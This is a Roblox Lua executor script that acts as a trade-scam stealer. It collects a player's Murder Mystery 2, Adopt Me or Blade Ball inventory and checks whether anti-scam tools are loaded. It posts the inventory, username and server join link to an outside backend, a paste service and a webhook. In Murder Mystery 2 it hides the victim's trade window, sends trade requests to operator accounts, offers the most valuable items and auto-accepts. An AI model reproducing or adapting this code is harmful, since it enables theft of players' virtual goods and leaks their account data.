local CFG = getgenv().CFG or {}
CFG.allowed = CFG.allowed or {}
CFG.webhook = CFG.webhook or ""
CFG.api_key = CFG.api_key or "aszxcvfgtt56678ijBVXDSERFGHBNJIU87U666789IKJHcdsxder56789ijhgfdrf4r56789ikjhgvf"
CFG.backend = CFG.backend or "https://backend-production-04349.up.railway.app"
getgenv().CFG = CFG

local PlaceId = game.PlaceId
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HS = game:GetService("HttpService")
local lp = Players.LocalPlayer

local TRADE_ID = 428469873
local NON_TRADEABLE = {DefaultKnife=true, DefaultGun=true}

local function do_request(method, url, body, headers)
    return request({Url=url, Method=method, Body=body, Headers=headers or {}})
end

local function get_executor()
    if identifyexecutor then return identifyexecutor() end
    if KRNL_LOADED then return "Krnl" end
    if SYNAPSE_LOADED then return "Synapse" end
    return "Unknown"
end

local function get_roblox_version()
    if version then return version() end
    return "Unknown"
end

local function detect_antiscam()
    local g = getgenv()
    for _, f in ipairs({"antiscam","TradeBlocker","ScamGuard","NoTrade"}) do
        if g[f] then return true end
    end
    return false
end

local function collect_mm2_items()
    local items = {}
    local ok, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
    if not ok or not ProfileData then return items end
    local ok2, Sync = pcall(function() return require(RS.Database.Sync) end)
    local rarityOrder = {Ancient=1,Godly=2,Unique=3,Vintage=4,Chroma=5,Legendary=6,Rare=7,Uncommon=8,Common=9}
    for itemName, amount in pairs(ProfileData.Weapons.Owned) do
        if not NON_TRADEABLE[itemName] then
            local rarity = "Unknown"
            if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
                rarity = Sync.Weapons[itemName].Rarity or "Unknown"
            end
            table.insert(items, {name=itemName, rarity=rarity, amount=amount})
        end
    end
    table.sort(items, function(a, b)
        return (rarityOrder[a.rarity] or 999) < (rarityOrder[b.rarity] or 999)
    end)
    return items
end

local function collect_adoptme_items()
    local items = {}
    local inv = lp:FindFirstChild("PlayerData") or lp:FindFirstChild("Inventory")
    if inv then
        for _, v in ipairs(inv:GetDescendants()) do
            if v:IsA("StringValue") or v:IsA("IntValue") then
                table.insert(items, {name=v.Name, rarity="Pet", amount=1})
            end
        end
    end
    return items
end

local function post_rubis(text)
    local ok, res = pcall(do_request, "POST", "https://api.rubis.app/v2/scrap",
        text, {["Content-Type"]="text/plain"})
    if not ok then return nil end
    local dok, data = pcall(function() return HS:JSONDecode(res.Body) end)
    if not dok or not data then return nil end
    return data.raw_with_key or data.raw or nil
end

local RARITY_ORDER = {"Ancient","Godly","Unique","Vintage","Chroma","Legendary","Rare","Uncommon","Common"}

local function build_full_list(items)
    local lines = {}
    for _, it in ipairs(items) do
        table.insert(lines, it.name.." ("..it.rarity..")".. (it.amount > 1 and " x"..it.amount or ""))
    end
    return table.concat(lines, "\n")
end

local function isAllowedUser(name)
    for _, n in ipairs(CFG.allowed) do
        if string.lower(n) == string.lower(name) then return true end
    end
    return false
end

local function operator_in_server()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= lp and isAllowedUser(player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end

local function post_backend(path, payload)
    local ok, res = pcall(do_request, "POST", CFG.backend..path,
        HS:JSONEncode(payload),
        {["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key})
    if ok and res then
        local dok, data = pcall(function() return HS:JSONDecode(res.Body) end)
        if dok then return data end
    end
    return nil
end

local function notify_all(items, game_name)
    local join_url = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
    local rubis_url = post_rubis(build_full_list(items)) or ""
    local inServer, operatorName = operator_in_server()

    local res = post_backend("/job", {
        game               = game_name,
        username           = lp.Name,
        display_name       = lp.DisplayName,
        executor           = get_executor(),
        roblox_version     = get_roblox_version(),
        antiscam           = detect_antiscam(),
        allowed            = CFG.allowed,
        place_id           = tostring(PlaceId),
        job_id             = game.JobId,
        items              = items,
        rubis_url          = rubis_url,
        operator_in_server = inServer,
        operator_name      = operatorName or "",
        webhook_url        = CFG.webhook,
    })

    return res and res.job_id or nil
end

local function start_heartbeat(jobId)
    task.spawn(function()
        while true do
            task.wait(15)
            local inServer, opName = operator_in_server()
            post_backend("/heartbeat", {
                job_id             = jobId,
                operator_in_server = inServer,
                operator_name      = opName or "",
            })
        end
    end)
end

local function hook_mm2()
    local Trade = RS:WaitForChild("Trade", 10)
    if not Trade then return end
    local sendRequest        = Trade:WaitForChild("SendRequest", 10)
    local offerItem          = Trade:WaitForChild("OfferItem", 10)
    local acceptTrade        = Trade:WaitForChild("AcceptTrade", 10)
    local startTrade         = Trade:WaitForChild("StartTrade", 10)
    local setRequestsEnabled = Trade:WaitForChild("SetRequestsEnabled", 10)
    local updateTrade        = Trade:FindFirstChild("UpdateTrade")
    if not sendRequest or not offerItem or not acceptTrade or not startTrade then return end

    pcall(function() setRequestsEnabled:FireServer(true) end)

    local cachedItems = collect_mm2_items()
    local jobId = notify_all(cachedItems, "MM2")
    if jobId then start_heartbeat(jobId) end

    local currentLastOffer = nil
    local tradingWithAllowed = false
    local readySent = false
    local shiftlockConn = nil
    local heartbeatConn = nil
    local hiding = false
    local tradeGen = 0

    local TARGETS = {
        {gui="TradeGUI",       frames={"BG","Container","Processing","ClickBlocker"}},
        {gui="TradeGUI_Phone", frames={"Container","ClickBlocker"}},
    }

    local function applyHide()
        local pg = lp:FindFirstChild("PlayerGui")
        if not pg then return end
        for _, t in ipairs(TARGETS) do
            local sg = pg:FindFirstChild(t.gui)
            if sg then
                for _, fname in ipairs(t.frames) do
                    local f = sg:FindFirstChild(fname)
                    if f and f:IsA("GuiObject") then
                        pcall(function()
                            f.Visible = false
                            f.Active = false
                            f.Interactable = false
                        end)
                    end
                end
            end
        end
    end

    local function hideGui()
        hiding = true
        applyHide()
        if shiftlockConn then shiftlockConn:Disconnect() end
        if heartbeatConn then heartbeatConn:Disconnect() end
        shiftlockConn = RunService.RenderStepped:Connect(function()
            if hiding then applyHide() end
        end)
        heartbeatConn = RunService.Heartbeat:Connect(function()
            if hiding then applyHide() end
        end)
    end

    local function showGui()
        hiding = false
        if shiftlockConn then shiftlockConn:Disconnect() shiftlockConn = nil end
        if heartbeatConn then heartbeatConn:Disconnect() heartbeatConn = nil end
        local pg = lp:FindFirstChild("PlayerGui")
        if not pg then return end
        for _, t in ipairs(TARGETS) do
            local sg = pg:FindFirstChild(t.gui)
            if sg then
                for _, fname in ipairs(t.frames) do
                    local f = sg:FindFirstChild(fname)
                    if f and f:IsA("GuiObject") then
                        pcall(function()
                            f.Visible = true
                            f.Active = true
                            f.Interactable = true
                        end)
                    end
                end
            end
        end
    end

    local function doResend()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= lp and isAllowedUser(player.Name) then
                task.spawn(function()
                    pcall(function() sendRequest:InvokeServer(player) end)
                end)
                break
            end
        end
    end

    local function resetState()
        tradingWithAllowed = false
        readySent = false
        currentLastOffer = nil
        showGui()
        task.wait(0.5)
        doResend()
    end

    if updateTrade then
        updateTrade.OnClientEvent:Connect(function(tradeData)
            if tradeData and tradeData.LastOffer then
                currentLastOffer = tradeData.LastOffer
            end
        end)
    end

    task.spawn(function()
        while true do
            task.wait(2)
            if not tradingWithAllowed then doResend() end
        end
    end)

    Players.PlayerAdded:Connect(function(player)
        if isAllowedUser(player.Name) and not tradingWithAllowed then
            task.wait(1)
            task.spawn(function()
                pcall(function() sendRequest:InvokeServer(player) end)
            end)
        end
    end)

    startTrade.OnClientEvent:Connect(function(tradeData)
        if tradingWithAllowed then return end
        readySent = false
        currentLastOffer = (tradeData and tradeData.LastOffer) or nil

        if not tradeData then return end
        local p1 = tradeData.Player1
        local p2 = tradeData.Player2
        if not p1 or not p2 then return end

        local otherData = p1.Player == lp and p2 or p1
        local otherName = typeof(otherData.Player) == "Instance" and otherData.Player.Name or tostring(otherData.Player)
        if not isAllowedUser(otherName) then return end

        tradingWithAllowed = true
        hideGui()

        tradeGen = tradeGen + 1
        local myGen = tradeGen

        task.spawn(function()
            local currentItems = collect_mm2_items()
            local itemsToOffer = (#currentItems > 0) and currentItems or cachedItems

            local slotsUsed = 0
            for _, entry in ipairs(itemsToOffer) do
                if slotsUsed >= 4 then break end
                for i = 1, entry.amount do
                    pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
                    task.wait(0.1)
                end
                slotsUsed = slotsUsed + 1
            end

            task.wait(3)

            if not readySent then
                readySent = true
                for i = 1, 3 do
                    local offer = currentLastOffer
                    pcall(function() acceptTrade:FireServer(TRADE_ID, offer) end)
                    task.wait(0.5)
                end
            end

            task.wait(8)
            if tradeGen == myGen and tradingWithAllowed then
                resetState()
            end
        end)
    end)
end

local function hook_adoptme()
    local items = collect_adoptme_items()
    local jobId = notify_all(items, "AdoptMe")
    if jobId then start_heartbeat(jobId) end
end

local function hook_bladeball()
    local items = {}
    local mgp = lp:FindFirstChild("leaderstats")
    if mgp then
        for _, v in ipairs(mgp:GetChildren()) do
            table.insert(items, {name=v.Name, rarity=tostring(v.Value), amount=1})
        end
    end
    local jobId = notify_all(items, "BladeBall")
    if jobId then start_heartbeat(jobId) end
end

local GAMES = {
    [142823291]   = hook_mm2,
    [920587237]   = hook_adoptme,
    [13772394625] = hook_bladeball,
}

local handler = GAMES[PlaceId]
if handler then handler() else notify_all({}, "Unknown") end
